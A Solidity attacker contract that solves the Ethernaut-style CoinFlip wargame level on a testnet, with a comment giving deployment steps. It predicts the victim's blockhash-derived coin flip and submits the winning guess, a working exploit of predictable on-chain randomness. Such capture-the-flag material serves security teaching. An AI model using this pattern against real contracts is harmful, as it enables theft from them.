pragma solidity ^0.5.0;

import "./CoinFlip.sol";

contract CoinFlipAttack {

  CoinFlip victimContract;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victimContractAddress) public {
    victimContract = CoinFlip(_victimContractAddress);
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    victimContract.flip(side);
    }
}

/** After we get our instance, we do in console: await contract.address, to get CoinFlip contract address.

Then we go to remix and deploy our attacker contract with CoinFlip contract address as argument, on Rinkeby.

Now that the attacker contract is deployed, we just call the flip function ten times

To check our consecutiveWins, we type in the console: Number(await contract.consecutiveWins()) */